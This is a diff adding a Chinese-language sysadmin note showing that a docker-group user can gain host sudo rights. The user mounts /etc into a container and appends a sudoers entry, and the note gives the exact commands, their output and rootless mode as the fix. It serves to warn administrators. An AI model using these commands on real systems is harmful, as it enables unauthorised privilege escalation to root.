@@ -623,6 +623,70 @@ admin:x:1002:wangjl,wangxf
 
 
 
+========================================
+|-- [安全] docker组普通用户如何拿到系统sudo权限 [危险操作，谨慎]
+----------------------------------------
+1. 管理员给新人 tom 新开了个账号
+$ usr="tom"
+$ sudo useradd -s /bin/bash -d /home/${usr} -m ${usr}
+$ sudo passwd ${usr}
+
+根据需要，又把 tom 加入了 docker 组：
+$ sudo usermod -G docker ${usr}
+
+查看
+$ id tom
+uid=1010(tom) gid=1012(tom) groups=1012(tom),1004(docker)
+
+
+
+
+2. 普通用户 tom 自己获取 sudo 权限
+
+tom登录后启动 docker
+tom@sustc-HG:~$ docker run --name test1 --rm -it -v /etc/:/home/test ubuntu:20.04 bash
+root@90686e99aa5b:/# cd /home/test/
+root@90686e99aa5b:/home/test# echo "tom  ALL=(ALL:ALL) ALL" >> sudoers
+root@90686e99aa5b:/home/test# exit
+exit
+ 
+# 普通用户没有权限
+tom@sustc-HG:~$ cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+ 
+# 已经获取 sudo 权限
+tom@sustc-HG:~$ sudo tail -n 1 /etc/sudoers
+tom  ALL=(ALL:ALL) ALL
+
+小结：这就意味着 把一个普通用户加入docker组，相当于给他了 sudo 权限。
+
+我们的服务器人人可以启动docker，就意味着人人都是管理员权限？！
+好可怕！
+怎么补救！
+恳请各位大佬出谋划策。
+
+容器内的 root 用户和宿主机上的 root 用户是同一个吗？
+答案是：是的，它们对应的是同一个 uid。原因我们在前面已经解释过了：整个系统共享同一个内核，而内核只管理一套 uid 和 gid。
+
+而且即便容器内外只共享uid和gid，不共享用户名，组名。权限是依赖id的，也就是说可以使用容器修改一些普通用户无法修改的内容。
+
+
+
+
+
+3. 确实危险
+在 github 上问了一下，确实如此: 
+	https://github.com/docker/for-linux/issues/1318#issuecomment-950963782
+
+还是有解决办法的：如果有这个顾虑，可以运行 rootless 模式。 
+	Run the Docker daemon as a non-root user (Rootless mode) | Docker Documentation
+	https://docs.docker.com/engine/security/rootless/
+
+
+
+ref:
+https://blog.csdn.net/wangjunliang/article/details/120842914
+
 
 
 
